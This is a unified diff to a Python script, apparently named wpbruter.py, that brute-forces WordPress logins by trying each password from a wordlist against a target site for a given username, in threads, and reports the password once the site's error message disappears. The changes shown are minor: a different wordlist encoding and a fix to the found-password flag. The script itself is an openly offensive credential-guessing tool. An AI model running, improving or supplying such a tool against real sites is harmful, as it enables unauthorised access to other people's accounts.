@@ -2,7 +2,7 @@ import sys
 import requests
 import threading
 
-pwd = "0"
+pwd = str("0")
 
 if len(sys.argv) not in [4]:
     print('[*] Usage: python wpbruter.py <target> <username> <wordlist>\n')
@@ -17,7 +17,7 @@ print ('[*] BruteForcing:', host)
 print ('[*] Username:', sys.argv[2])
 
 try:
-    passwords = [x.strip() for x in open(sys.argv[3], 'r', encoding='utf-8').readlines() if x]
+    passwords = [x.strip() for x in open(sys.argv[3], 'r', encoding='latin-1').readlines() if x]
     print ('[*] Total Passwords Loaded:', len(passwords), '\n')
 
 except IOError:
@@ -34,7 +34,8 @@ def Brute(target, wlist):
         if "The password you entered for the username" not in response.text:
             print()
             print('[+] Password Found: '+ password)
-            pwd = "1"
+            global pwd
+            pwd += str("1")
             sys.exit(0)
 
 try:
@@ -47,6 +48,6 @@ except KeyboardInterrupt:
     sys.exit(0)
 
 
-if pwd == "0":
+if pwd == str("0"):
     print("[-] Password Not Found")
     sys.exit(0)
